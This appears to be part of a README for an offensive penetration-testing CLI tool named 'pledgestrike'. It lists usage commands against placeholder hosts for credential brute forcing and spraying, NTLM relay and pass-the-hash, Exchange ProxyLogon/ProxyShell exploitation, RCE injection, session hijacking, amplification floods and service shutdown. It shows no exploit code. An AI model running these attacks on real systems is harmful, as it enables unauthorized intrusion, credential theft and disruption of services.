
### Finger Protocol Recon
```bash
# Finger user enumeration
pledgestrike finger enum --url http://finger-target.com:79

# Finger user brute force
pledgestrike finger brute --url http://finger-target.com:79

# Finger redirect attack
pledgestrike finger redirect --url http://finger-target.com:79

# Finger bomb test
pledgestrike finger bomb --url http://finger-target.com:79
```

### ZooKeeper Attack
```bash
# ZooKeeper environment dump
pledgestrike zookeeper env --url http://zk-target.com:2181

# ZooKeeper data dump
pledgestrike zookeeper dump --url http://zk-target.com:2181

# ZooKeeper credential brute force
pledgestrike zookeeper brute --url http://zk-target.com:2181

# ZooKeeper server info
pledgestrike zookeeper srvr --url http://zk-target.com:2181
```

### etcd Attack
```bash
# etcd unauthorized access
pledgestrike etcd access --url http://etcd-target.com:2379

# etcd data dump
pledgestrike etcd dump --url http://etcd-target.com:2379

# etcd key enumeration
pledgestrike etcd keys --url http://etcd-target.com:2379

# etcd auth bypass
pledgestrike etcd auth --url http://etcd-target.com:2379
```

### UPnP/SSDP Attack
```bash
# UPnP discovery
pledgestrike upnp discover --url http://upnp-target.com:1900

# UPnP port exposure test
pledgestrike upnp expose --url http://upnp-target.com:1900

# UPnP SOAP injection
pledgestrike upnp inject --url http://upnp-target.com:1900

# UPnP amplification flood
pledgestrike upnp flood --url http://upnp-target.com:1900
```

### IDOR Tester
```bash
# IDOR vulnerability test
pledgestrike idor test --url http://target.com/api/users/1

# IDOR enumeration
pledgestrike idor enum --url http://target.com/api/users/1

# IDOR pattern prediction
pledgestrike idor predict --url http://target.com/api/users/1

# IDOR chain attack
pledgestrike idor chain --url http://target.com/api/users/1
```

### Mass Assignment Attack
```bash
# Mass assignment vulnerability check
pledgestrike mass check --url http://target.com/api/profile

# Mass assignment field injection
pledgestrike mass inject --url http://target.com/api/profile

# Mass assignment privilege escalation
pledgestrike mass escalate --url http://target.com/api/profile

# Mass assignment field enumeration
pledgestrike mass enum --url http://target.com/api/profile
```

### Cookie Attack
```bash
# Cookie session fixation
pledgestrike cookie fixation --url http://target.com

# Cookie injection
pledgestrike cookie inject --url http://target.com

# Cookie tampering
pledgestrike cookie tamper --url http://target.com

# Cookie buffer overflow
pledgestrike cookie overflow --url http://target.com
```

### Session Attack
```bash
# Session fixation
pledgestrike session fixation --url http://target.com

# Session token prediction
pledgestrike session predict --url http://target.com

# Session hijacking
pledgestrike session hijack --url http://target.com

# Session puzzle
pledgestrike session puzzle --url http://target.com
```

### RCE Scanner
```bash
# RCE detection
pledgestrike rce detect --url http://target.com

# RCE injection
pledgestrike rce inject --url http://target.com

# RCE chain attack
pledgestrike rce chain --url http://target.com

# RCE out-of-band detection
pledgestrike rce oob --url http://target.com
```

### Spring Boot Actuator
```bash
# Actuator environment dump
pledgestrike actuator env --url http://target.com:8080

# Actuator heap dump
pledgestrike actuator heapdump --url http://target.com:8080

# Actuator Jolokia exploit
pledgestrike actuator jolokia --url http://target.com:8080

# Actuator shutdown
pledgestrike actuator shutdown --url http://target.com:8080
```

### Debug/Info Endpoint Scanner
```bash
# Debug endpoint scan
pledgestrike debug scan --url http://target.com

# HTTP TRACE method test
pledgestrike debug trace --url http://target.com

# Stack trace exposure
pledgestrike debug stack --url http://target.com

# Source code exposure
pledgestrike debug source --url http://target.com
```

### OpenAPI/Swagger Abuse
```bash
# OpenAPI spec discovery
pledgestrike openapi spec --url http://target.com

# OpenAPI endpoint fuzzer
pledgestrike openapi fuzz --url http://target.com

# OpenAPI auth bypass
pledgestrike openapi auth --url http://target.com

# OpenAPI parameter injection
pledgestrike openapi inject --url http://target.com
```

### Unicode/Encoding Attack
```bash
# Unicode homoglyph attack
pledgestrike unicode homoglyph --url http://target.com

# Overlong UTF-8 encoding
pledgestrike unicode overlong --url http://target.com

# Unicode bidi (Trojan Source)
pledgestrike unicode bidi --url http://target.com

# Unicode normalization attack
pledgestrike unicode normalize --url http://target.com
```

### WSDL/SOAP Exploitation
```bash
# WSDL parser
pledgestrike wsdl parse --url http://target.com/service?wsdl

# WSDL injection
pledgestrike wsdl inject --url http://target.com/service

# WSDL XXE
pledgestrike wsdl xxe --url http://target.com/service

# WSDL fuzzer
pledgestrike wsdl fuzz --url http://target.com/service
```

### NTLM Attack
```bash
# NTLM relay
pledgestrike ntlm relay --url http://target.com

# NTLM pass-the-hash
pledgestrike ntlm pass --url http://target.com

# NTLM brute force
pledgestrike ntlm brute --url http://target.com

# NTLM enumeration
pledgestrike ntlm enum --url http://target.com
```

### WinRM Attack
```bash
# WinRM brute force
pledgestrike winrm brute --url http://target.com:5985

# WinRM remote execution
pledgestrike winrm exec --url http://target.com:5985

# WinRM enumeration
pledgestrike winrm enum --url http://target.com:5985

# WinRM lateral movement
pledgestrike winrm lateral --url http://target.com:5985
```

### Exchange Exploitation
```bash
# Exchange ProxyLogon (CVE-2021-26855)
pledgestrike exchange proxylogon --url http://exchange-target.com

# Exchange ProxyShell (CVE-2021-34473)
pledgestrike exchange proxyshell --url http://exchange-target.com

# Exchange ProxyNotShell (CVE-2022-41040/41082)
pledgestrike exchange proxynotshell --url http://exchange-target.com

# Exchange enumeration
pledgestrike exchange enum --url http://exchange-target.com
```

### OWA Attack
```bash
# OWA brute force
pledgestrike owa brute --url http://exchange-target.com/autodiscover/autodiscover.xml

# OWA user enumeration
pledgestrike owa enum --url http://exchange-target.com/autodiscover/autodiscover.xml

# OWA password spray
pledgestrike owa spray --url http://exchange-target.com/autodiscover/autodiscover.xml

# OWA inbox rule injection
pledgestrike owa rule --url http://exchange-target.com/ews/exchange.asmx
```

### SharePoint Exploitation
```bash
# SharePoint enumeration
pledgestrike sharepoint enum --url http://sharepoint-target.com

# SharePoint brute force
pledgestrike sharepoint brute --url http://sharepoint-target.com

# SharePoint unauthorized access
pledgestrike sharepoint access --url http://sharepoint-target.com

# SharePoint injection
pledgestrike sharepoint inject --url http://sharepoint-target.com
```

## Dependencies

clap, tokio, serde, serde_json, base64, hmac, sha2, colored, rayon, anyhow, reqwest, url, rand, regex, rustls, webpki-roots, x509-parser

## License

For authorized security testing only. Use responsibly.
